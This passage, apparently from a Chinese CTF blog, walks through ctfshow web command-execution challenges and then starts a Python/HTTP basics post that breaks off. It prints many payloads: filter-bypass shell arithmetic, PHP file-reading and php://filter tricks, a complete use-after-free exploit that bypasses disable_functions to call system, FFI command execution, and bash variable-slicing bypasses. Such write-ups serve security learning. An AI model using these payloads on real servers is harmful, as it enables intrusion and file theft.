class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个文件内容</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ls</span>然后<span class="token function">cat</span> /var/www/html/flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果一次不成功就repeater多试几次</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/ming2.png"></p><p>拿到flag</p>        <h5 id="57"   >          <a href="#57" class="heading-link"><i class="fas fa-link"></i></a><a href="#57" class="headerlink" title="57"></a>57</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>[a-z]|[0-9]|`||#|&#39;|&quot;|`|%|\x09|\x26|\x0a|&gt;|&lt;|.|,|?|*|-|=|[/i</p><p>过滤了大量字符，最终需要构建36即可，没有过滤<code>$</code>，而在Linux中$是变量的关键字，所以我们可以使用变量</p><pre class="line-numbers language-none"><code class="language-none">$(())这个变量中的()代表数学运算，结果为0，所以echo $(())0对这个变量进行取反操作结果为echo ~$(())~0那么我们再对~0进行数学运算得到的结果就是echo $((~$(())))~1所以我们想得到36就是让36个~1相加再取反echo $((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h5 id="58"   >          <a href="#58" class="heading-link"><i class="fas fa-link"></i></a><a href="#58" class="headerlink" title="58"></a>58</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:POSTc&#x3D;file_get_contents(&#39;flag.php&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>命令执行，突破禁用函数</p><p>首先尝试system发现被过滤了，emmmm尝试过后发现能执行系统命令的全被禁用了</p><p>那么尝试能否读取文件，使用file_get_contents读取成功，提示中也显示show_source同样可用</p>        <h5 id="59"   >          <a href="#59" class="heading-link"><i class="fas fa-link"></i></a><a href="#59" class="headerlink" title="59"></a>59</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:POSTc&#x3D;show_source(&#39;flag.php&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>能执行系统命令的就别试了，全挂了</p><p>show_source可用</p><p>还可尝试通过include来包含文件，再通过PHP伪协议进行读取</p><pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.phpPOSTc&#x3D;include($_GET[&#39;flie&#39;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>        <h5 id="60"   >          <a href="#60" class="heading-link"><i class="fas fa-link"></i></a><a href="#60" class="headerlink" title="60"></a>60</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:POSTc&#x3D;highlight_file(&#39;flag.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>上一题可用的方法也可</p>        <h5 id="61"   >          <a href="#61" class="heading-link"><i class="fas fa-link"></i></a><a href="#61" class="headerlink" title="61"></a>61</h5>      <p>同上</p>        <h5 id="62"   >          <a href="#62" class="heading-link"><i class="fas fa-link"></i></a><a href="#62" class="headerlink" title="62"></a>62</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:POSTc&#x3D;include(&#39;flag.php&#39;);echo $flag;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>上面所有方法皆可</p>        <h5 id="63"   >          <a href="#63" class="heading-link"><i class="fas fa-link"></i></a><a href="#63" class="headerlink" title="63"></a>63</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:POSTc&#x3D;include(&#39;flag.php&#39;);var_dump(get_defined_vars());<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>get_defined_vars()</code>可获得所有已定义的变量，当不知道变量名时可使用这个</p><p>上面方法同样🉑️</p>        <h5 id="64"   >          <a href="#64" class="heading-link"><i class="fas fa-link"></i></a><a href="#64" class="headerlink" title="64"></a>64</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:POSTc&#x3D;include(&#39;flag.php&#39;);echo $flag;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>scandir(&#39;.&#39;)</code>可用于扫描文件，和ls一个意思，当我们不知道文件名时可使用</p>        <h5 id="65"   >          <a href="#65" class="heading-link"><i class="fas fa-link"></i></a><a href="#65" class="headerlink" title="65"></a>65</h5>      <p>同上</p>        <h5 id="66"   >          <a href="#66" class="heading-link"><i class="fas fa-link"></i></a><a href="#66" class="headerlink" title="66"></a>66</h5>      <p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-03-19" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-19</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 17.49.25.png)</p><p>尝试失败还被嘲讽了，首先扫描一下文件，发现根目录下有flag.txt，<code>highlight_file(&#39;/flag.txt&#39;)</code>读取即可</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTc&#x3D;highlight_file(&#39;&#x2F;flag.txt&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>        <h5 id="67"   >          <a href="#67" class="heading-link"><i class="fas fa-link"></i></a><a href="#67" class="headerlink" title="67"></a>67</h5>      <p>同上</p>        <h5 id="68"   >          <a href="#68" class="heading-link"><i class="fas fa-link"></i></a><a href="#68" class="headerlink" title="68"></a>68</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:POSTc&#x3D;include(&#39;&#x2F;flag.txt&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>属于是离谱了，直接封了<code>highlight_file</code>函数，<code>var_dump(scandir(&#39;/&#39;))</code>，发现在根目录中，直接include文件，没有php标签即为直接显示源码，等于直接显示flag.txt的内容</p>        <h5 id="69"   >          <a href="#69" class="heading-link"><i class="fas fa-link"></i></a><a href="#69" class="headerlink" title="69"></a>69</h5>      <p>同上</p>        <h5 id="70"   >          <a href="#70" class="heading-link"><i class="fas fa-link"></i></a><a href="#70" class="headerlink" title="70"></a>70</h5>      <p>继续白嫖</p>        <h5 id="71"   >          <a href="#71" class="heading-link"><i class="fas fa-link"></i></a><a href="#71" class="headerlink" title="71"></a>71</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:POSTc&#x3D;include(&#39;&#x2F;flag.txt&#39;);exit();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>尝试白嫖发现失败，下载源码进行查看，发现在输出之前将缓冲区中的所有数字字母换成了问号，那么我们让它包含完直接退出就行了</p>        <h5 id="72"   >          <a href="#72" class="heading-link"><i class="fas fa-link"></i></a><a href="#72" class="headerlink" title="72"></a>72</h5>      <p>文件换位置了哭哭，scandir找不到根目录，var_dump也没了，哭哭</p><p>看提示</p><p>首先找出文件名</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">payload:POSTc&#x3D;$a&#x3D;new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125; exit(0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-03-19" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-19</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 23.52.16.png)uaf脚本如下</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpfunction ctfshow($cmd) &#123;    global $abc, $helper, $backtrace;    class Vuln &#123;        public $a;        public function __destruct() &#123;             global $backtrace;             unset($this-&gt;a);            $backtrace &#x3D; (new Exception)-&gt;getTrace();            if(!isset($backtrace[1][&#39;args&#39;])) &#123;                $backtrace &#x3D; debug_backtrace();            &#125;        &#125;    &#125;    class Helper &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123;        $address &#x3D; 0;        for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123;            $address &lt;&lt;&#x3D; 8;            $address |&#x3D; ord($str[$p+$j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m &#x3D; 8) &#123;        $out &#x3D; &quot;&quot;;        for ($i&#x3D;0; $i &lt; $m; $i++) &#123;            $out .&#x3D; sprintf(&quot;%c&quot;,($ptr &amp; 0xff));            $ptr &gt;&gt;&#x3D; 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123;        $i &#x3D; 0;        for($i &#x3D; 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] &#x3D; sprintf(&quot;%c&quot;,($v &amp; 0xff));            $v &gt;&gt;&#x3D; 8;        &#125;    &#125;    function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak &#x3D; strlen($helper-&gt;a);        if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;    function parse_elf($base) &#123;        $e_type &#x3D; leak($base, 0x10, 2);        $e_phoff &#x3D; leak($base, 0x20);        $e_phentsize &#x3D; leak($base, 0x36, 2);        $e_phnum &#x3D; leak($base, 0x38, 2);        for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;            $p_type  &#x3D; leak($header, 0, 4);            $p_flags &#x3D; leak($header, 4, 4);            $p_vaddr &#x3D; leak($header, 0x10);            $p_memsz &#x3D; leak($header, 0x28);            if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123;                 $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;                $data_size &#x3D; $p_memsz;            &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123;                 $text_size &#x3D; $p_memsz;            &#125;        &#125;        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) &#x3D; $elf;        for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;            $leak &#x3D; leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                                if($deref !&#x3D; 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak &#x3D; leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                                if($deref !&#x3D; 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak) &#123;        $base &#x3D; 0;        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;        for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;            $addr &#x3D; $start - 0x1000 * $i;            $leak &#x3D; leak($addr, 0, 7);            if($leak &#x3D;&#x3D; 0x10102464c457f) &#123;                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs) &#123;        $addr &#x3D; $basic_funcs;        do &#123;            $f_entry &#x3D; leak($addr);            $f_name &#x3D; leak($f_entry, 0, 6);            if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123;                return leak($addr + 8);            &#125;            $addr +&#x3D; 0x20;        &#125; while($f_entry !&#x3D; 0);        return false;    &#125;    function trigger_uaf($arg) &#123;        $arg &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);        $vuln &#x3D; new Vuln();        $vuln-&gt;a &#x3D; $arg;    &#125;    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;        die(&#39;This PoC is for *nix systems only.&#39;);    &#125;    $n_alloc &#x3D; 10;     $contiguous &#x3D; [];    for($i &#x3D; 0; $i &lt; $n_alloc; $i++)        $contiguous[] &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);    trigger_uaf(&#39;x&#39;);    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];    $helper &#x3D; new Helper;    $helper-&gt;b &#x3D; function ($x) &#123; &#125;;    if(strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    $closure_handlers &#x3D; str2ptr($abc, 0);    $php_heap &#x3D; str2ptr($abc, 0x58);    $abc_addr &#x3D; $php_heap - 0xc8;    write($abc, 0x60, 2);    write($abc, 0x70, 6);    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj &#x3D; str2ptr($abc, 0x20);    $binary_leak &#x3D; leak($closure_handlers, 8);    if(!($base &#x3D; get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#39;t determine binary base address&quot;);    &#125;    if(!($elf &#x3D; parse_elf($base))) &#123;        die(&quot;Couldn&#39;t parse ELF header&quot;);    &#125;    if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#39;t get basic_functions address&quot;);    &#125;    if(!($zif_system &#x3D; get_system($basic_funcs))) &#123;        die(&quot;Couldn&#39;t get zif_system address&quot;);    &#125;    $fake_obj_offset &#x3D; 0xd0;    for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4);     write($abc, 0xd0 + 0x68, $zif_system);     ($helper-&gt;b)($cmd);    exit();&#125;ctfshow(&quot;cat &#x2F;flag0.txt&quot;);ob_end_flush();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTc&#x3D;上面的代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>        <h5 id="73"   >          <a href="#73" class="heading-link"><i class="fas fa-link"></i></a><a href="#73" class="headerlink" title="73"></a>73</h5>      <p>include回来里，flagc.txt</p>        <h5 id="74"   >          <a href="#74" class="heading-link"><i class="fas fa-link"></i></a><a href="#74" class="headerlink" title="74"></a>74</h5>      <pre class="line-numbers language-none"><code class="language-none">payload:POSTc&#x3D;include(&#39;&#x2F;flagx.txt&#39;);exit();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>首先扫目录，同上题payload，而后发现在根目录有flagx.txt尝试包含成功</p>        <h5 id="75"   >          <a href="#75" class="heading-link"><i class="fas fa-link"></i></a><a href="#75" class="headerlink" title="75"></a>75</h5>      <p>ban掉了open_basedir访问文件的方式，只能通过别的方法来访问文件，可以通过mysql访问，在前面几题中可以找到mysql的账号密码，最终payload如下</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">payload:POSTc&#x3D;try &#123;  $dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;,&#39;root&#39;);  foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36.txt&quot;)&#39;) as $row)&#123;    echo($row[0]);   &#125;  $dbh &#x3D; null;&#125;catch (PDOException $e) &#123;  echo $e-&gt;getMessage();  exit(0);&#125;exit(0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拓展PDO知识：</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">PHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。PDO随PHP5.1发行，在PHP5.0的PECL扩展中也可以使用，无法运行于之前的PHP版本。一个实例&lt;?php$dbms&#x3D;&#39;mysql&#39;;     &#x2F;&#x2F;数据库类型$host&#x3D;&#39;localhost&#39;; &#x2F;&#x2F;数据库主机名$dbName&#x3D;&#39;test&#39;;    &#x2F;&#x2F;使用的数据库$user&#x3D;&#39;root&#39;;      &#x2F;&#x2F;数据库连接用户名$pass&#x3D;&#39;&#39;;          &#x2F;&#x2F;对应的密码$dsn&#x3D;&quot;$dbms:host&#x3D;$host;dbname&#x3D;$dbName&quot;;try &#123;    $dbh &#x3D; new PDO($dsn, $user, $pass); &#x2F;&#x2F;初始化一个PDO对象    echo &quot;连接成功&lt;br&#x2F;&gt;&quot;;    &#x2F;*你还可以进行一次搜索操作    foreach ($dbh-&gt;query(&#39;SELECT * from FOO&#39;) as $row) &#123;        print_r($row); &#x2F;&#x2F;你可以用 echo($GLOBAL); 来看到这些值    &#125;    *&#x2F;    $dbh &#x3D; null;&#125; catch (PDOException $e) &#123;    die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br&#x2F;&gt;&quot;);&#125;&#x2F;&#x2F;默认这个不是长连接，如果需要数据库长连接，需要最后加一个参数：array(PDO::ATTR_PERSISTENT &#x3D;&gt; true) 变成这样：$db &#x3D; new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT &#x3D;&gt; true));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h5 id="76"   >          <a href="#76" class="heading-link"><i class="fas fa-link"></i></a><a href="#76" class="headerlink" title="76"></a>76</h5>      <p>同上改名字</p>        <h5 id="77"   >          <a href="#77" class="heading-link"><i class="fas fa-link"></i></a><a href="#77" class="headerlink" title="77"></a>77</h5>      <p>首先还是扫目录，文件名flag36x.txt，尝试上题方法发现数据库消失，看提示是PHP7.4以上的新特性，可以通过新建一个FFI对象来执行系统命令，又因为执行系统命令后没有回显，所以我们把执行后的结果放到网站目录下的一个文本文件中进行读取</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payload<span class="token punctuation">:</span><span class="token constant">POST</span>c<span class="token operator">=</span><span class="token variable">$ffi</span> <span class="token operator">=</span> <span class="token class-name static-context">FFI</span><span class="token operator">::</span><span class="token function">cdef</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"int system(const char *command);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'/readflag > /var/www/html/1.txt'</span><span class="token punctuation">;</span><span class="token variable">$ffi</span><span class="token operator">-></span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后访问/1.txt即可</p>        <h5 id="118"   >          <a href="#118" class="heading-link"><i class="fas fa-link"></i></a><a href="#118" class="headerlink" title="118"></a>118</h5>      <p>首先查看源码，发现输入被包含到system函数中执行，尝试<code>echo，whoami，ls，cat</code>全部失效想方法绕过，输入空格发现可以执行，所以可以尝试通过构造系统变量来执行，查看提示的图片</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-03-21" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-21</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 16.39.03.png)</p><p>发现是默认配置文件下的文件名列表，可以通过剪裁构造变量，读取文件命令最容易进行构造的就是<code>nl</code>，想拼接出nl只需要取系统配置变量最后一位n和当前执行目录最后一位l即可，最终payload如下</p><pre class="line-numbers language-none"><code class="language-none">payload:$&#123;PATH:~0&#125;$&#123;PWD:~0&#125;$IFS????.???<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现还是不行，是因为过滤了数字，没关系，剪裁字符还可通过大写字母解决，真·最终payload如下</p><pre class="line-numbers language-none"><code class="language-none">payload:$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.???<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>系统变量补充知识</strong></p><pre class="line-numbers language-none"><code class="language-none">$PATH 系统配置变量$PWD 当前执行目录$HOME 默认进入的目录$SHELL$USER 当前user$SHLVL 代表当前shell窗口的深度，一般为1$PHP_CFLAGS 指定头文件（.h文件）的路径，如：CFLAGS&#x3D;-I&#x2F;usr&#x2F;include -I&#x2F;path&#x2F;include。同样地，安装一个包时会在安装路径下建立一个include目录，当安装过程中出现问题时，试着把以前安装的包的include目录加入到该变量中来。$PHP_VERSION PHP版本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Linux变量补充知识</strong></p><pre class="line-numbers language-none"><code class="language-none">$&#123;变量名:从哪一位开始取:取多长&#125;，如没有长度默认取到最后，如果没有起始位就从头开始$&#123;#变量名&#125;，代表这个变量的长度$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>        <h5 id="119"   >          <a href="#119" class="heading-link"><i class="fas fa-link"></i></a><a href="#119" class="headerlink" title="119"></a>119</h5>      <p>先尝试上一把的是否可行，不行所以直接看提示吧，系统变量的知识补充在上一道题了，针对本题</p><pre class="line-numbers language-none"><code class="language-none">SHLVL的值为2，#SHLVL的值为1，从PHP_VERSION的第二位取一个为3，也就是$&#123;PHP_VERSION:$&#123;SHLVL&#125;:$&#123;#SHLVL&#125;&#125;为3，最终取PHP_CFLAGS变量从第三位开始的前三个即可构造tac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>最终payload如下</p><pre class="line-numbers language-none"><code class="language-none">payload:$&#123;PHP_CFLAGS:$&#123;PHP_VERSION:$&#123;SHLVL&#125;:$&#123;#SHLVL&#125;&#125;:$&#123;PHP_VERSION:$&#123;SHLVL&#125;:$&#123;#SHLVL&#125;&#125;&#125; ????.???<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h5 id="120"   >          <a href="#120" class="heading-link"><i class="fas fa-link"></i></a><a href="#120" class="headerlink" title="120"></a>120</h5>      <p>上一把的字符太长了，只能通过别的命令读取了</p><pre class="line-numbers language-none"><code class="language-none">tips：Linux中的base64在&#x2F;bin目录之下，base64 文件名即可将文件进行base64编码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以我们最终构造出结果为/bin/base64 flag.php即可</p><p>首先是/字符，PWD首位，而后bin可使用通配符，尝试base64也使用通配符不可行，所以我们尝试构建出数字4来匹配</p><pre class="line-numbers language-none"><code class="language-none">tips：RANDOM变量能生成一万以内的随机数，用#取长度即可有概率得到4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最终payload</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTcode&#x3D;$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><del>多刷新几次总会出来的</del></p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-03-21" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-21</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 19.36.51.png)</p>        <h5 id="121"   >          <a href="#121" class="heading-link"><i class="fas fa-link"></i></a><a href="#121" class="headerlink" title="121"></a>121</h5>      <p>尝试上题payload，发现SHLVL被过滤了，所以我们需要一个1</p><pre class="line-numbers language-none"><code class="language-none">tips:通过$?来实现的，$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以我们使用$</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python于web层应用</title>
      <link href="/posts/4256.html"/>
      <url>/posts/4256.html</url>
      
        <content type="html"><![CDATA[        <h1 id="Python于web层应用"   >          <a href="#Python于web层应用" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python于web层应用" class="headerlink" title="Python于web层应用"></a>Python于web层应用</h1>              <h2 id="HTTP协议基础"   >          <a href="#HTTP协议基础" class="heading-link"><i class="fas fa-link"></i></a><a href="#HTTP协议基础" class="headerlink" title="HTTP协议基础"></a>HTTP协议基础</h2>              <h3 id="协议分类"   >          <a href="#协议分类" class="heading-link"><i class="fas fa-link"></i></a><a href="#协议分类" class="headerlink" title="协议分类"></a>协议分类</h3>      <p>HTTP 1.0 80端口 单次一个链接</p><p>HTTP 1.1 80端口 多次可一个链接</p><p>HTTP协议不够安全，进而发展出了HTTPS协议</p><p>HTTPS 443端口 加密后数据传输</p><span id="more"></span>        <h3 id="请求方法"   >          <a href="#请求方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h3>              <h6 id="HTTP-1-0"   >          <a href="#HTTP-1-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#HTTP-1-0" class="headerlink" title="HTTP 1.0"></a>HTTP 1.0</h6>      <p>GET POST HEAD</p>        <h6 